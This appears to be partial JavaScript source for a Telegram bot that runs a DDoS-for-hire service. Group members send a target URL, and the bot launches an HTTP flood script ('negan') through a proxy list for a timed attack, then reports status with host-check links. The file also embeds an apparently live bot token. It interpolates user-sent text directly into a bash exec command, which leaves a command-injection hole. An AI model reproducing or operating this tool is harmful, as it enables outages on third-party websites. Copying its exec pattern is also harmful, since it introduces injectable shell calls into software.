const TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process'), token = '7831523452:AAECX05ntCb9_Aypg-RUM5NEzuIXBk4lhuc', adminId = 7371969470, allowedGroupIds = new Set([-1002434530321, -1002334544605, -1002365124072, 556677889, 998877665]), bot = new TelegramBot(token, { polling: true }), maxSlot = 1, maxCurrent = 3, maxTimeAttacks = 120;
...
const initBot = () => {
    ...
    bot.on('message', async msg => {
        ...
        if (text.startsWith('http')) {
            ...
            const startMessage = JSON.stringify({ Status: "✨🚀🛸 Successfully 🛸🚀✨", Caller: caller, "PID Attack": pid, Website: host, Time: `${attackTime} Giây`, Maxslot: maxSlot, Maxtime: maxTimeAttacks, ConcurrentAttacks: currentProcesses, StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }), CheckHostURL: `Check Host (https://check-host.net/check-http?host=${host})`, HostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})` }, null, 2);
            ...
            exec(`node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
                ...
                bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' }); delete activeAttacks[pid]; userProcesses[userId]--; currentProcesses--;
    ...
    bot.on('polling_error', restartBot); process.on('uncaughtException', restartBot); process.on('unhandledRejection', restartBot);
}
